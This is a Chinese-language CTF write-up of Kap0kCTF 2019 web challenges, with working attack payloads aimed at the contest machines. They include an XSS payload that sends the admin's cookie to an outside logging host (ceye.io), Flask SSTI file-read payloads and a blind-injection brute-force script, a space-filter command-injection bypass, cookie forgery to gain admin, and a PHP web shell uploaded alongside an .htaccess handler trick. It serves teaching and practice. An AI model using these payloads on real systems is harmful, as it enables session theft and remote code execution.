# Kap0kCTF_2019_Web_WP

本来预计大概5题会有3个题可以解（不包括签到的ping题），翻车了翻车了

## easyXSS

0 solved 

### 解题思路

鉴于许多人还不了解XSS，因此这道题的wp会写的比较详细

首先从题目 `easyXSS`, 显然是XSS的题目，引用介绍

> XSS攻击通常指的是通过利用网页开发时留下的漏洞，通过巧妙的方法注入恶意指令代码到网页，使用户加载并执行攻击者恶意制造的网页程序。这些恶意网页程序通常是JavaScript，但实际上也可以包括Java、 VBScript、ActiveX、 Flash 或者甚至是普通的HTML。攻击成功后，攻击者可能得到包括但不限于更高的权限（如执行一些操作）、私密网页内容、会话和cookie等各种内容

简单来说就是注入js代码

然后我们看一下这个题，是一个很标准的xss的题目，主要功能有两个，一个是post写留言，一个是feedback发送给管理员

![](https://img-cjm00n.oss-cn-shenzhen.aliyuncs.com/20191118005541.png)可以注意到有个cookie，提示flag在管理员的cookie

![](https://img-cjm00n.oss-cn-shenzhen.aliyuncs.com/20191118005452.png)

那么如何拿到管理员的cookie，自然是利用feedback，先看feedback，有两个参数，一个是post ID，也就是我们的留言md5，一个是验证码

![](https://img-cjm00n.oss-cn-shenzhen.aliyuncs.com/20191118005606.png)

验证码可以直接搜一下`md5截断比较`, 是一个经典的考点了，直接就可以跑出来

那这个题的思路就是通过feedback将我们的留言发送给管理员从而窃取cookie，当然这里有个要求是cookie的`httponly`为false，如果是true是读不到的，因此我们需要构造留言来获取cookie，如果写过js的可能很清楚，在js里面获取cookie可以直接

document.cookie

看一下留言部分, 简单测试一下可以看到过滤

![](https://img-cjm00n.oss-cn-shenzhen.aliyuncs.com/20191118010035.png)

这里过滤了几个常见的标签和两个事件，假设我们这里有script，那只需要

```html
<script>document.location="http://xxxx.ceye.io/"+document.cookie</script>
```

`document.location`用来做跳转，其中的`ceye.io`是一个dns平台，也可以使用vps nc接受，如果有img标签呢

```html
<img src=1 onerror="javascript:document.location='http://xxxx.ceye.io/'+document.cookie" />
```

很遗憾这里都被过滤了，但是我们细看一下这个过滤

```
/script|<img|<a|<frame| onload|onerror/is
```

在`onload`前面有个空格，也就是说如果不添加空格，就可以直接绕过去，这也就是我的hint

> ban list中有hint，缘，妙不可言

那事件有了，用啥标签呢，搜一下，发现有个`svg`标签可以用，那怎么绕过空格？

```
<svg/onload="document.location='http://4ut4mi.ceye.io/?'+document.cookie">
```

然后先写一下留言，自己点一下，可以在ceye中看到自己的cookie已经发送成功了

![](https://img-cjm00n.oss-cn-shenzhen.aliyuncs.com/20191118010916.png)那么接下来就是发送给管理员了，右键获取一下id发送出去

![](https://img-cjm00n.oss-cn-shenzhen.aliyuncs.com/20191118011107.png)

可以在ceye中看到flag

![](https://img-cjm00n.oss-cn-shenzhen.aliyuncs.com/20191118011159.png)

payload不唯一，还有很多可以利用的标签和事件，这里只是提供一种我的思路，遗憾的是比赛的时候并没有看到大家成功打到cookie，可能目前各大练习平台上xss类的题目较少的原因吧，平时遇到的机会不太多，就讲详细点，有空的可以复现一下或者研究其他的payload

## Unserialize？

1 solved

### 解题思路

打开题目可以看到是一个相当简陋的文件上传，可以自己fuzz一下什么后缀是被ban掉的（当然后来我把源码放上去了，大家康康源码，搜索引擎搜一搜hint应该就知道怎么做了...）

可以发现最后是ban掉了`php|pht|html|htaccess|xml`，其他文件可以成功上传，上传之后可以看到文件的保存路径。在这个页面F12一下还可以看到一个`showimage.php`(当然给了源代码之后就不用看到这个信息也可以了)

`showiamge.php`中代码如下：

```php
<?php
    include 'config.php';
    if(!isset($_REQUEST['path'])){
        echo "please tell me the path through the key \"path\"";
    }
    else{
        if(file_exists($_REQUEST['path']))
        {
            if(preg_match('/flag/i', $_REQUEST['path']))
            {
                die('nonono');
            }
            else
            {
                header('Content-Type:image/jpeg');
                $filename = $_REQUEST['path'];
                $handler = fopen($filename, "r");
                $res = fread($handler, filesize($filename));
                fclose($handler);
                echo $res;
            }
        }
        else{
            echo "Ooops, we can not found this file!";
        }
    }
```

这里的本意是构造一个文件泄露，只要输入路径就可以看到除了flag以外靶机上的所有文件，这样就可以去读到该题目包含的所有源码（但是看这题没什么人做我就中午把源码放上去降低难度了）

并且开头引入了`config.php`，里面只有一个类，定义了析构函数，里面还有一个`cat /flag`那这就很明显是一个反序列化的漏洞了，接下来找利用点。

根据我给的hint，phar反序列化，是很容易就可以找到相关资料的（我还特意自己去搜了一下，无论是google还是百度都是在搜索第一位....）

这里放一个链接 https://paper.seebug.org/680/ 

链接里具体介绍了构造phar触发反序列化的步骤，我就不再赘述

最后将构造好的phar上传，后缀名任意，在path中直接传入phar协议访问该phar文件就可以触发反序列化获得flag了

## easySQL

11 solved

### 解题思路

原题是过滤了` `和`=`号，不过早上上线后考虑了题目难度，就在维护的时候删去了`=`号的过滤，就变成真的签到题了，这里就不细说了，绕过的方法很简单

## SSTI

0 solved

### 参考题目

参考以下 ssti 题目修改了一下

```url
https://evi0s.com/2018/11/26/深入ssti-从nctf2018两道flask看bypass新姿势/
```

原题就是过滤关键词，绕过关键词的方法有很多，数组+字符串连接，或者编码绕过，这里给其中一个 payload（用的是子类catch_warnings） 出来

```python
{{[]['__cl'+'ass__']['__ba'+'se__']['__subc'+'lasses__']()[388]['__in'+'it__']['__glo'+'bals__']['__buil'+'tins__']['op'+'en']('/flag', 'r').read()}}
```

不熟悉 flask ssti 需要自己去翻资料理解，以上面的 payload 作为例子，大致思路就是用一个数据类型（`数组[]`）得到`object`类，然后搜索有`__init__.__globas__`变量的子类（这里用的是`catch_warnings`，当然其他也可以），然后直接调用 open 函数读 flag。至于如果找到合适的子类，自己找资料，然后根据输出结果用记事本处理一下得到下标，或者暴力一点就是 bp 爆破，一般记事本比较快，非特殊情况不用 bp。

### 出题思路

在上面的过滤基础上再把`{{、}}`也给过滤了，这时候我们就不能用一般的`{{xxxxx}}`的形式进行模板注入了，稍微百度一下绕过方法，那就是用`{% if xxxx %}kkkk{% endif %}` 进行盲注。

### 解题步骤

#### 暴力找子类

根据提示得知 python 版本为 3.6，用 bp 遍历数组下表找到`catch_warnings`的位置，经检验结果是 388。

```python
http://222.201.144.148:19000/{%if []['__cl'+'ass__']['__ba'+'se__']['__subc'+'lasses__']()[0]['__na'+'me__']=='catch_warnings' %}kkkk{%endif%}
```

#### 盲注遍历每一位 flag

```python
import requests, re, string

url = 'http://222.201.144.148:19000/'
char_set = string.printable
flag = ''

for i in range(1,33):
    for ch in char_set:
        session = requests.Session()
        response = session.get(url+"{%if []['__cl'+'ass__']['__ba'+'se__']['__subc'+'lasses__']()[388]['__in'+'it__']['__glo'+'bals__']['__buil'+'tins__']['op'+'en']('/flag', 'r').read()[:"+str(i)+"]=='"+flag+ch+"' %}kkkk{%endif%}")
        if 'kkkk' in response.text:
            flag += ch
            print "[*] flag is: {}".format(flag)
            break
```

#### 出题翻车

比赛到一半考虑到大家可能会自闭，我还是把`{{、}}`给删掉了，变成普普通通的绕过关键字，所以最终的 payload 就是第一个，或许大家百度一下就可以找到 exp 了...

## 听说我是签到题

3 solved

### 出题思路

命令执行+绕过关键字

### 解题步骤

根据提示过滤了空格，cat 和 flag

- 空格绕过

空格可以变量拼接绕过，或者用 ${IFS}

- cat绕过

反斜杠绕过 `ca\t`，或者其他显示命令绕过`nl、tail...`

- flag绕过

变量拼接绕过，或正则绕过

#### 最终 payload

```
;nl${IFS}/*
```

## easy_upload

0 solved

### 解题思路

拿到题目首先注册登陆，进去之后可以看到文件上传页面，但是上传文件需要admin的密码，所以要解决的第一个问题就是如何得到admin密码。

这次比赛里有人尝试了数据库注入，其实这道题也是有可能注出来的，但是对于大家现阶段来说可能是有难度的，详细的大家可以再尝试一下二次注入，出题人太懒了就不给注入方向的wp了。（有人做的话可以问我

题目中的简单功能有注册、登陆、上传文件、改密码，很多人没有注意到改密码这一项。

进去改密码这一项，截个包：

![](https://img-cjm00n.oss-cn-shenzhen.aliyuncs.com/20191118170929.png)

cookie里面很明显有user这一项，url解码后base64解码一下得到yyptest，发现就是用户名。结合题目给的hint可知，每个人的管理员就是用户名+'admin'，于是改user，user = eXlwdGVzdGFkbWlu。

![](https://img-cjm00n.oss-cn-shenzhen.aliyuncs.com/20191118170953.png)

修改成功, 发现此时已经可以上传文件。这道题其实就是上传一个.htaccess文件的问题。

根据报错提醒，构造一个.jpg文件，内容为

```php
<?php
$a = 'sys';
$b = 'tem';
$c = $a.$b;
$c($_GET[cmd]);
?>
```

再上传.htaccess文件，内容为：

```<FilesMatch 1.jpg>
<FilesMatch 1.jpg>
SetHandler application/x-httpd-php
</FilesMatch>
```

这个文件的大概意思就是用解析php的方式来解析1.jpg这个文件。
payload1: http://120.78.71.12:2203/uploads/1.jpg?cmd=ls .. (得flag位置)
payload2：http://120.78.71.12:2203/uploads/1.jpg?cmd=cat ../flag.php
得flag:

![](https://img-cjm00n.oss-cn-shenzhen.aliyuncs.com/20191118171158.png)


